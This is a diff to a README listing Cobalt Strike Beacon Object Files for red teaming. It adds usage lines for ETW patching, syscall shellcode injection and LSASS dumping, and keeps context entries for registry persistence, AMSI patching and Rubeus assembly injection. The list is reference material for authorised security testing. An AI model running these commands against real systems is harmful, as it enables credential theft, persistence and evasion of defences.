@@ -6,7 +6,7 @@ Useful Cobalt Strike Beacon Object Files (BOFs) used during red teaming and pene
 
 - [**Situational Awareness BOF**](https://github.com/trustedsec/CS-Situational-Awareness-BOF)<br />
 BOF that provides host enumeration and awarness commands which are more opsec friendly<br />
-Example commands include:
+Example commands include:<br />
 ```
 arp --> List arp tables
 ipconfig --> Run ipconfig
@@ -40,8 +40,6 @@ bofportscan 192.168.1.10 3389 --> Port scanner
 inline-execute RegistryPersistence.o Install --> Install registry persistence
 inline-execute RegistryPersistence.o Remove --> Remove registry persistence
 ```
-
-- []()
 ---
 ### Executing .NET Assemblies
 
@@ -54,15 +52,22 @@ The BOF also supports several flags to disabling AMSI via in memory patching, di
 Another alternative .NET executable loader to inject an assembly into a running process<br />
 ```inject-assembly 0 /home/Rubeus.exe [args...]```
 
-- []()
-
-- []()
-
 ---
 ### Exploitation
 
+- [**ajpc500 BOFs**](https://github.com/ajpc500/BOFs)<br />
+A collection of **very** useful BOFs for various utilities including different techniques of shellcode injection with syscalls, process dumping (LSASS!), and patching ETW for better evasion.<br />
+```
+etw stop --> Patch etw
+syscalls_inject <PID> <listener_name> / syscalls_shinject <PID> <path_to_bin> --> Syscalls shellcode injection
+syscalls_spawn <listener> / syscalls_shspawn <path_to_bin> --> Spawn and syscalls injections
+static_syscalls_apc_spawn <listener> / static_syscalls_apc_spawn <path_to_bin> --> Spawn and static syscalls shellcode njection (NtQueueApcThread)
+static_syscalls_inject <PID> <listener_name> / static_syscalls_shinject <PID> <path_to_bin> --> Static syscalls shellcode injection (NtCreateThreadEx)
+static_syscalls_dump <PID> [path_to_output] --> Process dump with syscalls (i.e. Dump LSASS!)
+```
+
 - [**MiniDumpWriteDump**](https://github.com/rookuu/BOFs)<br />
-Uses static syscalls to dump a process such as LSASS to output file
+Uses static syscalls to dump a process such as LSASS to output file<br />
 ```minidumpwritedump <PID> <path_of_dmp?>```
 
 
